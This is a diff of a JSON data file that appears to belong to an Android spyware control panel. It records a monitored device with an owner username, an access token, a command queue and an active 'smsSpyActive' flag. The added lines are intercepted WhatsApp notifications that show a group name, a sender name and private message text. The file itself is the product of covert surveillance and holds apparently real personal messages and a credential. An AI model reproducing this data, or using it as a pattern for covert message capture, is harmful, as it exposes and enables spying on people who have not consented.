@@ -116,7 +116,7 @@
     "deviceName": "HP-DDD-6DEF",
     "ownerUsername": "kamu cii",
     "token": "246f790ea49ac7f86fc663e710b7b286",
-    "lastSeen": 1775818592990,
+    "lastSeen": 1775818622830,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-10T10:06:23.436Z",
@@ -132,6 +132,22 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "Memeriksa pesan baru",
+        "time": "10/04 18:57",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775818623808
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "‎Senam Rappocini (8 pesan): ~ Tinieq",
+        "content": "Terciduk lg",
+        "time": "10/04 18:57",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775818623800
+      },
       {
         "appName": "WhatsApp",
         "sender": "WhatsApp",
